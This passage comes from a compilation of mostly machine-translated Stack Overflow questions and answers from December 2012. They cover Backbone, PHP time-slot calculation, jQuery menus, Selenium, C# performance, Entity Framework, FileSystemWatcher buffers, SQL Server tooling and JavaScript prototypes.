        if (model) { model.destroy(); }
      });
    });
  }
});

var Cats = PushCollection.extend({
  model: Cat
}); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T15:04:18.670

您应该能够通过模型的原型访问它：

```
Model.prototype.idAttribute 
```

或在您的示例代码中

```
var model = coll.get(obj[coll.model.prototype.idAttribute]); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T20:29:03.510

也许我误解了这个问题，但是您不能使用该`Collection.where()`方法吗？

从骨干文档：

> **在哪里** `collection.where(attributes)`
> 
> 返回集合中与传递的属性匹配的所有模型的数组。对于过滤器的简单情况很有用。
> 
> ```
> var friends = new Backbone.Collection([
>   {name: "Athos",      job: "Musketeer"},
>   {name: "Porthos",    job: "Musketeer"},
>   {name: "Aramis",     job: "Musketeer"},
>   {name: "d'Artagnan", job: "Guard"},
> ]);
> 
> var musketeers = friends.where({job: "Musketeer"});
> 
> alert(musketeers.length); 
> ```

因此，在您的示例代码中：

```
var PushCollection = Backbone.Collection.extend({
  initialize: function () {
    coll = this;
    somePushConnection.on('deleted', function (deleted) {
      _.each(deleted, function (obj) {
        // obj being something like: {name: 'mittens', age: 302}
        var model = coll.where(obj);
        if (model) { model.destroy(); }
      });
    });
  }
}); 
```

# php - 根据 PHP 中的开始和结束时间返回时隙数组

> ID：13916556
> 
> 赞同：4
> 
> 时间：2012-12-17T15:01:31.897
> 
> 标签：php

我需要你的帮助来解决以下问题。我正在使用 PHP 构建一个网站，我想在该网站上显示一个显示一周中各天的日历，每一天细分为 3 个时间段。这些时间段要么是免费的，要么是预订的，在这种情况下，该时间段是不可选择的。

到目前为止一切顺利，但问题在于将时间段显示为已预订。我从一个脚本中获取预订数据，该脚本给了我一个开始日期和时间，以及一个结束日期和时间。这些日期/时间戳可以是任何东西，并且不受时间段时间的限制。它们可以在同一天，也可以跨越多天。每天的时间段都是一样的：从 9 点到 13 点、13 点到 17 点和 19 点到 23 点。

例如，假设我的开始时间是 17-12-2012 13:00，结束时间是 18-12-2012 11:00，我希望我的函数给我一个这样的数组：

```
array(1) {
  ["meetingroom1_booked"]=>
  array(3) {
    [0]=>
    array(2) {
      ["day"]=>
      string(10) "2012-12-17"
      ["timeslot"]=>
      string(1) "2"
    }
    [1]=>
    array(2) {
      ["day"]=>
      string(10) "2012-12-17"
      ["timeslot"]=>
      string(1) "3"
    }
    [2]=>
    array(2) {
      ["day"]=>
      string(10) "2012-12-18"
      ["timeslot"]=>
      string(1) "1"
    }
  }
} 
```

我一直在为此绞尽脑汁，但无法想出一个好的解决方案来处理跨越多天的开始时间。一天的开始和结束时间没有问题：我可以将开始结束时间与时间段时间进行比较。当然，这在多天之内都行不通。任何指向正确方向的指针都非常感谢！谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T16:28:37.580

另一种算法简单的方法：

```
<?php
$start_date = '2012-12-17';
$start_time = '13:00';
$end_date = '2012-12-18';
$end_time = '11:00';
$slots = array(1=>'09:00', 2=>'13:00', 3=>'19:00');

// [helper]
$start_date_stamp = strtotime($start_date);
$end_date_stamp = strtotime($end_date);
$startdate_timestamp = strtotime($start_date . ' ' . $start_time);
$enddate_timestamp = strtotime($end_date . ' ' . $end_time);
// [/helper]

$cur_date_stamp = $start_date_stamp;
$result = array();
if ($enddate_timestamp >= $startdate_timestamp) {
    // [loop for each date]
    while($cur_date_stamp <= $end_date_stamp) {
        foreach($slots as $slkey=>$slval) {
            if ($cur_date_stamp == $start_date_stamp) { // compare for current date = start date
                $check_slot_stamp = strtotime(date('Y-m-d', $cur_date_stamp) . ' ' . $slval);
                if ($startdate_timestamp <= $check_slot_stamp) {
                    $result[] = array(
                        'day' => date('Y-m-d', $cur_date_stamp),
                        'timeslot' => $slkey
                    );
                }
            }
            elseif ($cur_date_stamp == $end_date_stamp) { // compare for current date = end date
                $check_slot_stamp = strtotime(date('Y-m-d', $cur_date_stamp) . ' ' . $slval);
                if ($check_slot_stamp <= $enddate_timestamp) {
                    $result[] = array(
                        'day' => date('Y-m-d', $cur_date_stamp),
                        'timeslot' => $slkey
                    );
                }
            }
            else { // 3 slots will be added for any date other than start_date and end_date
                $result[] = array(
                    'day' => date('Y-m-d', $cur_date_stamp),
                    'timeslot' => $slkey
                );
            }
        }
        $cur_date_stamp = strtotime('+1 day', $cur_date_stamp); // next day
    }
    // [/loop for each date]
}
$result = array('meetingroom1_booked'=>$result);
var_dump($result); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T15:43:29.803

这是我想出的一个通用函数，它可能会有所帮助。我对“时间段”的计算可能与您想要的不完全匹配，但您可以根据自己的需要进行更新。

```
$res = calc('01-12-2012 09:00', '01-12-2012 13:00');
print_r($res);
$res = calc('17-12-2012 13:00', '18-12-2012 11:00');
print_r($res);

function calc($start, $end) {
    // generic way to determine time slot; value is the high hour.
    static $slots = array(1 => 13, 2 => 17, 3 => 23);

    $oneDay = new \DateInterval("P1D");

    if (!($start instanceof \DateTime)) {
        $start = date_create($start);
    }
    if (!($end instanceof \Datetime)) {
        $end = date_create($end);
    }

    $ary = array();
    $now = clone $start;
    do {
        $res = array('day' => $now->format('Y-m-d'));
        foreach ($slots as $idx => $hour) {
            if ($now->format('H') <= $hour) {
                $res['slot'] = $idx;
                break;
            }
        }
        $ary[] = $res;

        $now->add($oneDay);
    } while ($now->format('Y-m-d') <= $end->format('Y-m-d'));

    return $ary;
} 
```

输出：

```
Array
(
    [0] => Array
        (
            [day] => 2012-12-01
            [slot] => 1
        )

)
Array
(
    [0] => Array
        (
            [day] => 2012-12-17
            [slot] => 1
        )

    [1] => Array
        (
            [day] => 2012-12-18
            [slot] => 1
        )

) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-17T15:45:55.727

这似乎测试正常。[http://www.laprbass.com/RAY_temp_daan.php](http://www.laprbass.com/RAY_temp_daan.php)

```
<?php // RAY_temp_daan.php
error_reporting(E_ALL);

/* PROBLEM DEFINITION
The timeslots are the same for each day: from 9 to 13, 13 to 17, and 19 to 23 hrs.

For example, say I have a start time of 17-12-2012 13:00, and an end time of 18-12-2012 11:00, I want my function to give me an array like this:

array(1) {
  ["meetingroom1_booked"]=>
  array(3) {
    [0]=>
    array(2) {
      ["day"]=>
      string(10) "2012-12-17"
      ["timeslot"]=>
      string(1) "2"
    }
    [1]=>
    array(2) {
      ["day"]=>
      string(10) "2012-12-17"
      ["timeslot"]=>
      string(1) "3"
    }
    [2]=>
    array(2) {
      ["day"]=>
      string(10) "2012-12-18"
      ["timeslot"]=>
      string(1) "1"
    }
  }
}
*/

// THE TIMEZONE
date_default_timezone_set('America/Chicago');

// THE START AND END TIMES
$alpha = '2012-12-17 13:00';
$omega = '2012-12-18 11:00';

// THE DEFINITION OF THE TIMESLOTS
$slots = array
( 1 => array
       ( 'lo' => '0900'
       , 'hi' => '1259'
       )
, 2 => array
       ( 'lo' => '1300'
       , 'hi' => '1659'
       )
, 3 => array
       ( 'lo' => '1900'
       , 'hi' => '2259'
       )
)
;

// MAKE AN ARRAY OF TIMESTAMPS OF THE HOURS
$tsa = strtotime($alpha);
$tsz = strtotime($omega);
$hours = range($tsa, $tsz, 3600);

// ASSIGN EACH HOUR TO A SLOT
foreach ($hours as $hour)
{
    $hhmm = date('Hi', $hour);
    foreach ($slots as $slot => $times)
    {
        if ($hhmm >= $times['lo'])
        {
            if ($hhmm <= $times['hi'])
            {
                // USE STRING NOTATION HERE SO WE CAN USE ARRAY_UNIQUE()
                $taken[$hour] = date('Y-m-d', $hour) . '|' . $slot;
            }
        }
    }
}
// REMOVE THE REDUNDANCIES
$taken = array_unique($taken);

// CONSTRUCT THE ASSOCIATIVE ARRAYS
foreach($taken as $thing)
{
    $arr = explode('|', $thing);
    $out[] = array('day' => $arr[0], 'timeslot' => $arr[1]);
}
// CONSTRUCT THE FINAL ARRAY
$out = array("meetingroom1_booked" => $out);

// SHOW THE WORK PRODUCT
echo '<pre>';
var_dump($out); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-17T15:13:22.400

当您将时间转换为 UNIX TIMESTAMP 时，您可以简单地执行此检查。

当前时间戳为：1355757162 明天5点的时间戳：1355846439

每个大于 1355757162 和小于 1355846439 的时间戳都应该被预订。

# jquery - 如何使下拉菜单在移动设备中工作？

> ID：13916559
> 
> 赞同：0
> 
> 时间：2012-12-17T15:01:47.003
> 
> 标签：jquery, html, jquery-ui, drop-down-menu

[你可以在这里看到现场直播](http://d3sine.com/demo/nana/)。我想让下拉菜单在移动设备上工作。换句话说，当点击菜单时，将显示子菜单，如果用户点击除主菜单之外的任何区域，其中包含子菜单，子菜单将不可见。

PS。JavaScript 已经嵌入在标题部分中。随意看看。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T15:09:56.913

尝试绑定“单击”功能以打开/关闭菜单，在这种情况下，它们将保持打开状态，直到下一次单击。

或者您可以使用 jquery 来执行此操作，使用 slideToggle 函数。

```
$('#jsddm > li').click(function(e){
e.preventDefault();
$(ddmenuitem).slideToggle();
}) 
```

无论如何，我建议您使用响应式模板 - 最好的模板之一可能是 Skeleton Grid（在 Google 上很容易找到，并且易于使用），它将使您的模板适应所有屏幕分辨率。看看吧！干杯马可

# ruby - 刷新 Webdriver 页面直到显示元素

> ID：13916564
> 
> 赞同：0
> 
> 时间：2012-12-17T15:02:00.183
> 
> 标签：ruby, selenium-webdriver

我正在用 Selenium-Webdriver 在 Ruby 中编写一个脚本，并且一直在尝试提出一个循环来刷新当前页面，直到出现某个元素 id。我当前的代码如下所示：

```
until driver.find_element(:id => "test").displayed?
 puts "#{driver.title} not live - reloading..."
 driver.navigate.refresh
end 
```

但是，当执行时，这会使整个脚本停止而不刷新页面（但不会引发任何错误）。我尝试用`driver.navigate.refresh`with代替`driver.get "http://website"`，但我得到了相同的结果。

为了诊断问题，我尝试查看我的第一行返回的内容。当找到 id 为“test”的元素时**，** a`puts driver.find_element(:id => "test").displayed?`将向控制台返回“true”。如果**未**找到元素“test”，则控制台挂起而不返回任何内容。我猜我需要实现某种计时器来强制脚本放弃搜索元素，但我希望它会动态地解决这个问题（取决于解释页面需要多长时间）。

任何有关使此循环正常工作的帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:21:23.593

我会替换

```
driver.navigate.refresh 
```

和

```
driver.navigate.to "http://page to refresh" 
```

有点蛮力，但它不应该以这种方式停止脚本。

我还会添加一个等待命令，这样你就不会陷入某种无限循环。

```
wait = Selenium::WebDriver::Wait.new(:timeout => 30)
wait.until{driver.find_element(:name, 'test')} 
```

如果 3 秒后仍未看到所需元素，则页面应刷新。

我希望这有帮助

# c# - 方法调用是否比访问类的私有字段慢？

> ID：13916565
> 
> 赞同：1
> 
> 时间：2012-12-17T15:02:04.163
> 
> 标签：c#, performance

今天正在处理一些我没有编写的代码，并注意到在一个类中有一个私有成员`m_privateMember`。编码器还包含一个名为的方法，该方法`GetPrivateMember()`仅包含`return m_privateMember`. 值得一提的是，这个方法在类本身中被大量使用，而不是简单地使用在这个范围内可访问的私有字段。

从语义上讲，我认为这有很多问题。一个方法与一个实际的 getter/setter 看起来很草率，我一直认为如果你在类范围内，最好是实际使用私有字段而不是 getter。不用说，我将清理代码纯粹是因为它不符合我们工作场所的编码标准，但我很想知道这样做是否也会以任何方式提高性能？

调用仅返回私有字段的方法会调用更多开销吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T15:16:26.623

直接回答你的问题：**这取决于。**

`return private field`对于该程序集中的任何调用，编译器（启用优化时）很可能内联一个属性，该属性只是一个单一的属性。在这种情况下，它与直接访问字段的操作相同。

对于从程序集外部访问属性的调用，JIT 编译器可能会以与静态编译器相同的方式内联调用，但不允许静态编译器这样做，因为它必须尊重程序集提供的接口. 这样您就可以用没有公共更改的新版本替换已编译的程序集，并且无需重新编译应用程序源即可使用新版本。

随着属性变得越来越复杂，被静态编译器或 JIT 编译器内联的机会变得越来越少，并且属性被调用得更像您想象的那样。

* * *

综上所述，关于性能的讨论确实是学术性的。在几乎所有实际示例中，调用属性与读取私有字段之间的区别是微不足道的。唯一可以测量的情况是，如果您在一些非常低规格的嵌入式系统上运行，或者每秒为系统的每个用户执行**数十亿次读取。**

大多数计算机都非常快，因此您应该选择使您的代码更易于维护的技术，而不是让您的执行时间额外减少 0.0000001 秒的技术。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T15:04:40.360

> 调用仅返回私有属性的方法会调用更多开销吗？

没有真正明显的区别，但美学和正确使用在这里，其他一切都是平等的，因为每个 get 和 set 实现的每个属性都会生成一个 getter 和 setter 方法 - 所以所有从属性返回事物值的调用实际上是一个方法调用，尽管可能有一些实现因素/优化正在进行，即使在速度方面，使用属性也“更好”，但在大多数情况下对可比效果的改进可以忽略不计。

# silverlight - Silverlight MVVM GridView 没有更新——因为行虚拟化？

> ID：13916569
> 
> 赞同：0
> 
> 时间：2012-12-17T15:02:20.497
> 
> 标签：silverlight, gridview, mvvm

我有一个绑定到 ViewModel 的 GridView。用户可以通过选择一个字段然后使用下面的文本框来编辑行上的一个字段。在保存之前，gridview 应该使用新字段进行更新。它在保存之前会更新，但是，用户必须首先在网格视图中滚动该行并返回。我认为这是因为行虚拟化。如何解决此问题，以便用户更改文本框后 GridView 立即更新？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T15:07:37.830

如果没有更多信息，我猜你的模型没有实现[INotifyPropertyChanged Interface](http://msdn.microsoft.com/en-us/library/ms229614.aspx)。

上面的链接解释了如何做到这一点。确保在数据更改后引发`PropertyChanged`事件。

# node.js - 等待在 node.js 中满足条件

> ID：13916579
> 
> 赞同：1
> 
> 时间：2012-12-17T15:02:51.537
> 
> 标签：node.js, coffeescript

我编写了一个包含以下 CoffeScript 代码的类：

```
class SomeClass
  # ...lots of other code...

  runner: ->
    process.nextTick =>
      if @some_condition
        @do_something_async()
      @runner() 
```

它应该做的就是等待`@some_condition`成真。这基本上是有效的，但是因为它真的很快循环通过所有这些，它会导致大量的资源使用。我将如何正确地做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T15:30:44.133

使用[事件](http://nodejs.org/api/events.html)来解耦条件和满足这些条件时必须运行的代码。

模式是：

1.  监听一个事件并设置一个在事件触发时运行的监听器

    ```
    eventEmitter.on("myEvent", function () {
        console.log("myEvent just happened");
    }); 
    ```

2.  当您的代码中的某些内容可以使您的条件变为真时，请检查它并相应地触发事件：

    ```
    doSomething();
    something++;
    if (something > max_something) {
        eventEmitter.emit("myEvent");
    } 
    ```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:05:21.627

而不是有一个等待某事为真的循环，只需创建一个回调函数并将其传递给长时间运行的函数并在该过程完成时调用回调。

# c# - Entity Framework Code First and Entity tracking

> ID：13916582
> 
> 赞同：0
> 
> 时间：2012-12-17T15:02:52.467
> 
> 标签：c#, .net, entity-framework, ef-code-first

Say you have a pure POCO object (eg. `Customer`) that you have created in the business layer and then called `context.Add(customer)`. Would the `Customer` object that you have passed in, and have reference to, be change tracked? Put another way: is the object you passed in the same one that is being tracked by the `ObjectStateManager` or is it a different one?

If they aren't the same object, wouldn't that lead to large memory consumption because there are two object graphs being maintained all the time: one by you (developer) in the business layer and the other by the `ObjectStateManager` in the DAL?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T15:37:50.923

The Idea of the Context is to not let it get too large. To even have multiple contexts with different views of the data. Even going as far as using a new context per Unit of Work. So yes it can get large. Some good reading on this topic Search for Bounded Contexts and Luw Pattern. eg from Julie Lerman.

Here is the decompiled IEntityWrapper managed by EF (from EF5.0 / Net 4.0) IENtityWrapper is used when putting an Entity in the ObjectContext.

I let you decide if it is big.
AS mentioned by Millimetric the reference is `object Entity { get; } // see below inside wrapper`

```
internal interface IEntityWrapper
{
void EnsureCollectionNotNull(RelatedEnd relatedEnd);
EntityKey GetEntityKeyFromEntity();
void AttachContext(ObjectContext context, EntitySet entitySet, MergeOption mergeOption);
void ResetContext(ObjectContext context, EntitySet entitySet, MergeOption mergeOption);
void DetachContext();
void SetChangeTracker(IEntityChangeTracker changeTracker);
void TakeSnapshot(EntityEntry entry);
void TakeSnapshotOfRelationships(EntityEntry entry);
void CollectionAdd(RelatedEnd relatedEnd, object value);
bool CollectionRemove(RelatedEnd relatedEnd, object value);
object GetNavigationPropertyValue(RelatedEnd relatedEnd);
void SetNavigationPropertyValue(RelatedEnd relatedEnd, object value);
void RemoveNavigationPropertyValue(RelatedEnd relatedEnd, object value);
void SetCurrentValue(EntityEntry entry, StateManagerMemberMetadata member, int ordinal, object target, object value);
void UpdateCurrentValueRecord(object value, EntityEntry entry);
RelationshipManager RelationshipManager { get; }
bool OwnsRelationshipManager { get; }
object Entity { get; }
EntityEntry ObjectStateEntry { get; set; }
EntityKey EntityKey { get; set; }
ObjectContext Context { get; set; }
MergeOption MergeOption { get; }
Type IdentityType { get; }
bool InitializingProxyRelatedEnds { get; set; }
bool RequiresRelationshipChangeTracking { get; }
} 

/// <summary>
/// Adds an object to the object context.
/// </summary>
/// <param name="entitySetName">Represents the entity set name, which may optionally be qualified by the entity container name. </param><param name="entity">The <see cref="T:System.Object"/> to add.</param><exception cref="T:System.ArgumentNullException">The <paramref name="entity"/> parameter is null. -or-The <paramref name="entitySetName"/> does not qualify.</exception>
public void AddObject(string entitySetName, object entity)
{
  EntityUtil.CheckArgumentNull<object>(entity, "entity");
  EntityEntry existingEntry;
  IEntityWrapper wrappedEntity = EntityWrapperFactory.WrapEntityUsingContextGettingEntry(entity, this, out existingEntry);
  if (existingEntry == null)
    this.MetadataWorkspace.ImplicitLoadAssemblyForType(wrappedEntity.IdentityType, (Assembly) null);
  EntitySet entitySet;
  bool isNoOperation;
  this.VerifyRootForAdd(false, entitySetName, wrappedEntity, existingEntry, out entitySet, out isNoOperation);
  if (isNoOperation)
    return;
  System.Data.Objects.Internal.TransactionManager transactionManager = this.ObjectStateManager.TransactionManager;
  transactionManager.BeginAddTracking();
  try
  {
    RelationshipManager relationshipManager = wrappedEntity.RelationshipManager;
    bool flag = true;
    try
    {
      this.AddSingleObject(entitySet, wrappedEntity, "entity");
      flag = false;
    }
    finally
    {
      if (flag && wrappedEntity.Context == this)
      {
        EntityEntry entityEntry = this.ObjectStateManager.FindEntityEntry(wrappedEntity.Entity);
        if (entityEntry != null && entityEntry.EntityKey.IsTemporary)
        {
          relationshipManager.NodeVisited = true;
          RelationshipManager.RemoveRelatedEntitiesFromObjectStateManager(wrappedEntity);
          RelatedEnd.RemoveEntityFromObjectStateManager(wrappedEntity);
        }
      }
    }
    relationshipManager.AddRelatedEntitiesToObjectStateManager(false);
  }
  finally
  {
    transactionManager.EndAddTracking();
  }
} 
```

# .net - Few Large SELECTS or Many Small SELECTS (Both Serial) for HTTPHandler?

> ID：13916588
> 
> 赞同：0
> 
> 时间：2012-12-17T15:03:24.367
> 
> 标签：.net, sql-server, database-connection, httphandler, large-data

I'm trying to export large excel files from database (client request). I currently use two selects to get data from two tables and store them in two sqldatasets. I have a delay before the file starts uploading since each table gives up to 100k rows.

I've turned off the outputbuffer in the httphandler, and I export each row from the first table as its' own vb.net html table (with dependent rows from the second dataset). Once the upload begins, it's very fast, but client still wants to get rid of that delay.

I was thinking I could break up the two large selects into many small selects to use as I build the html tables, opening and closing each connection.

Can sql server handle it?

What are the downsides?

I've looked everywhere and can find nothing. Many thanks in advance!

**Limitations**

The second table is dependent upon the first table, so I can either hit it once for everything and loop or many time for each row of the first table...right?...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T16:06:41.783

忽略我之前的回答。我很困惑。

我在这里看到两种可能性：

1.  你的查询很慢。
2.  您正在将查询结果转换为内存中的集合（人们通常会`.ToList()`在他们完全不需要的地方做）。

在这两种情况下，我们都需要查看您的代码。我可以告诉您的一件事是，将查询拆分为子集查询可能会减慢您的速度。

# html - Social Plugin Alignment

> ID：13916593
> 
> 赞同：0
> 
> 时间：2012-12-17T15:03:37.223
> 
> 标签：html, css, css-float, alignment, facebook-social-plugins

This is a site that i'm currently working on: [Site Link](http://luxury-decor.co.uk)

The problem I have is with the social plugins alignment. At first they were fine and showed one below the other (which is what I want) but now the facepile and twitter plugin just won't go below the facebook plugin. Anyone have any ideas?

Thanks in advance

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T15:36:08.007

@itzChris, It is perfectly possible to do this. I recommend you use Firebug, and see the classes of markup generated by the plugin. Then just customize them.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:09:35.800

我已经在 Chrome 中尝试了不同的缩放级别 - 110% 的缩放效果很好，但在 100% 时它们彼此相邻。一种简单的解决方案是将它们包装到一个 div 甚至单独的 div 中，然后按照您喜欢的方式放置这些 div。

# c# - Is it really that expensive to increase FileSystemWatcher.InternalBufferSize?

> ID：13916595
> 
> 赞同：14
> 
> 时间：2012-12-17T15:03:43.427
> 
> 标签：c#, .net, performance, filesystemwatcher

I'm using a `FileSystemWatcher` to monitor changes in a folder, but as soon as I have more than a few hundred modifications in a short time, I miss some of them because the internal buffer overflows. So I want to increase the `InternalBufferSize` (I know it won't really solve the problem, but it will make it less likely to occur), but I see this warning in the [documentation](http://msdn.microsoft.com/en-us/library/system.io.filesystemwatcher.internalbuffersize.aspx):

> However, increasing buffer size is expensive, **because it comes from non-paged memory that cannot be swapped out to disk**, so keep the buffer as small as possible.

So my question is: does it really matter? Most computers today have at least 1GB of RAM, so it seems to me that if I set the buffer size to 1MB (instead of the default 8KB), it shouldn't really matter if 1MB can't be swapped out to disk. Or am I missing something? I don't know much about low level stuff such as paged/non-paged memory, so I'm not sure what the impact would be...

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-12-17T16:06:35.683

分配缓冲区的内存当然是宝贵的资源。Windows 不能很好地处理耗尽内存池，驱动程序将开始随机失败。池的大小是动态设置的（但可以更改）并且取决于可用 RAM 的数量。

FSW 要求的默认缓冲区大小为 8192 字节。在现代机器上不多。底层的 winapi 函数不允许你请求超过 64KB。一个条目是缓冲区是 12 字节加上文件路径的长度乘以 2。所以更糟糕的情况是在缓冲区用完之前有 8192 / (12 + 260*2) = 15 个通知。这在大多数情况下应该可以正常工作，除非您监控整个驱动器或您正在观看的目录中有非常高的磁盘流量。在这种情况下，要求更大的缓冲区是公平的。没有黄金公式，一定要实现 FileSystemWatcher.Error 事件，这样你就*知道*你遇到了缓冲区问题。

在大多数实际情况下，您需要仔细处理 FSW 事件。当进程仍然锁定文件时，它们将被引发。因此，打开或复制文件之类的操作很麻烦。您可以通过将通知放在线程安全队列中并使用另一个线程尝试获取文件上的锁来处理这个问题，如有必要，请重复。这样的队列现在也是自动快速清空缓冲区的一个很好的方法。你现在唯一需要注意的是队列不会超过合理的比例，这会使你的程序因 OOM 崩溃。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-17T15:26:20.177

考虑一个消费者生产者设计来读取 FileSystemWatcher 事件。

[BlockingCollection 概述](http://msdn.microsoft.com/en-us/library/dd997371.aspx)

如果您有一些不需要处理的 FileSystemWatcher 事件，请快速关闭它们。
或者，如果有些人的处理速度比其他人快，则有一个单独的集合来减少总计数。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-17T15:16:05.507

非分页内存大小有限（更新：现代版本的 Windows 没有以前版本那样严格的限制，内存量现在是一个灵活的值，取决于 Windows 可用的整体 RAM）并且非常重要内核模式居民（设备驱动程序，操作系统本身）。在没有严格控制的情况下消费它会很快导致系统不稳定，更糟糕的是，你不会找到导致这种不稳定的原因。

此外，正如评论所暗示的，重要的不是缓冲区大小，而是从缓冲区中删除数据的速度。

在大多数情况下，文件系统过滤器驱动程序会比 FileSystemWatcher 做得更好。好处是您可以拥有所需的任何日志缓冲区（因为您可以在所需的任何内存中创建它，并且不受非分页内存的限制）并且您可以在事件发生时处理事件，而不是在事件发生后处理。此外，您可以过滤比 FileSystemWatcher 更精细的请求。

# sql - Access Pass-Through Outer Apply

> ID：13916600
> 
> 赞同：2
> 
> 时间：2012-12-17T15:04:10.610
> 
> 标签：sql, sql-server, ms-access, select, pass-through

I'm attempting to use an outer apply in an access pass-through query; however, it seems to have issues with the outer apply. The query is below. It runs fine in SQL Server directly, but when run as a pass-through query, I get a syntax error in the FROM clause.

The syntax error text is: "Syntax error in FROM clause" The pass-through will run and produce data when I text run it; however, when I attempt to save it for the report, the validation issue occurs.

```
SELECT AccountNumber, ICN, Provider, RequestDate, patLast, patFirst
FROM tblracaccounts
OUTER APPLY (
SELECT TOP 1 patLast, patFirst FROM tblAccts WHERE LEFT(icn,14)=LEFT(tblracaccounts.ICN,14)
) t2
WHERE ICN NOT IN (SELECT ICN FROM tblracstatuses WHERE Cancelled=1 OR Findings='No Findings')
ORDER BY Provider, RequestDate DESC 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T16:27:36.707

报表不允许将外部应用作为直接在报表中的传递查询。将查询移至访问传递查询，然后在报表中引用该查询即可。

# sql-server - Comment Out Set Var Declarations True results in errors from MS Build

> ID：13916602
> 
> 赞同：1
> 
> 时间：2012-12-17T15:04:15.017
> 
> 标签：sql-server, msbuild, sql-server-data-tools

I am working to automate the scripting of an SSDT project so that it can be deployed later with alternative values for variables being passed in.

My publish profile looks like this.

```
<?xml version="1.0" encoding="utf-8"?>
  <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <PropertyGroup>
     <IncludeCompositeObjects>True</IncludeCompositeObjects>
     <TargetConnectionString>Data Source=.;Integrated Security=True;Pooling=False</TargetConnectionString>
     <TargetDatabaseName>BLANK</TargetDatabaseName>
     <UpdateDatabase>False</UpdateDatabase>
     <ScriptDatabaseOptions>True</ScriptDatabaseOptions>
     <BlockOnPossibleDataLoss>True</BlockOnPossibleDataLoss>
     <CreateNewDatabase>True</CreateNewDatabase>
     <IgnoreObjectPlacementOnPartitionScheme>False</IgnoreObjectPlacementOnPartitionScheme>
     <ProfileVersionNumber>1</ProfileVersionNumber>
     <CommentOutSetVarDeclarations>True</CommentOutSetVarDeclarations>
   </PropertyGroup>
 </Project> 
```

In my test script I am then calling the following from powershell

```
$Directory = 'C:\GitProjects\CI\DevPOC\Database\ETL POC\AdventureWorksDW\'
$Publish = 'AdventureWorksDW.publish.xml'

Set-Location $Directory
& $env:windir\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe /t:Build
& $env:windir\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe /t:Publish /p:SqlPublishProfilePath`="$Directory\$Publish" 
```

I then get a number of errors which all relate to the variable values, examples below.

```
Deploy error SQL72014: SQL Execution error: A fatal error occurred. The variable DatabaseName could not be found.  [C:\GitProjects\CI\POC\Database\ETL POC\AdventureWorksDW\AdventureWorksDW.sqlproj] 
```

If however I set CommentOutSetVarDeclarations to false the script is generated without error. When performing the same task through SSDT no errors are raised.

Has anyone experienced similar behaviour?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-03T15:43:00.540

因此，在与 Microsoft 支持反复讨论之后，我找到了解决此问题的方法。似乎发布配置文件中设置的参数UpdateDatabase没有被拾取并以这种方式使用。不是 100% 确定这是否被确认为错误，但通过使用以下命令可以正常工作。

```
& $env:windir\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe /t:Publish /p:SqlPublishProfilePath`="$Directory\$Publish" /p:UpdateDatabase=False 
```

# javascript - Pure Javascript prototype

> ID：13916608
> 
> 赞同：0
> 
> 时间：2012-12-17T15:04:46.127
> 
> 标签：javascript, oop

I would expect the output of the following code to be:

```
one
two
three 
```

Here's the code: [http://jsfiddle.net/5banB/15/](http://jsfiddle.net/5banB/15/)

Why is the function code also in the output and how do I solve it?

And please don't answer: loop only 3 times :)

### Code from jsfiddle:

```
Object.prototype.example = function(args) {
    var elmnt = this;

    for(var a in args)
    {
        elmnt.innerHTML += args[a] + "<br/>";
    }
}

var numbers = ['one', 'two', 'three'];

document.getElementById("mydiv").example(numbers); 
```

​</p>

### Output

```
one
two
three
function (args) { var elmnt = this; for(var a in args) { elmnt.innerHTML += args[a] + "
"; } } 
```

### Update:

So how would I go about writing an extension of, say every node in my DOM? What's the preferred way?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T15:07:48.643

`for in`循环遍历对象的所有可枚举属性。

您已`example`为每个对象添加了一个属性。

Object 构造函数位于 Array 构造函数的原型链上，因此每个数组都有一个`example`属性。

一般来说，如果你使用`for in`循环，你会想用它[`hasOwnProperty`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Object/hasOwnProperty)来测试属性是否直接在对象上，而不是通过原型链继承。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:15:20.887

了解原型可能是一个很好的起点。您可能可以在 google 上找到大量优秀的文章。

[http://yehudakatz.com/2011/08/12/understanding-prototypes-in-javascript/](http://yehudakatz.com/2011/08/12/understanding-prototypes-in-javascript/)

许多这样的文章也可能讨论向对象原型和 for 循环添加函数/属性的纯恶。

如果您认为原型仍然是您想要的，请尝试在您的数组上使用基于索引的循环

```
for(var i=0;i<arguments[0].length;i++){
    elmnt.innerHTML += args[a] + "<br/>";
} 
```

# jquery - jQuery menue parent child child

> ID：13916610
> 
> 赞同：0
> 
> 时间：2012-12-17T15:04:52.717
> 
> 标签：jquery, wordpress

Okay so I have a jQuery menu on this page [here.](http://wptemp.site90.net)

When you click on a parent (Bureau or Projecten) the child menue stays open at all the times even if you go: parent -> child -> child.

This does not work on: Bureau -> Publicaties -> "child" The menue closes.

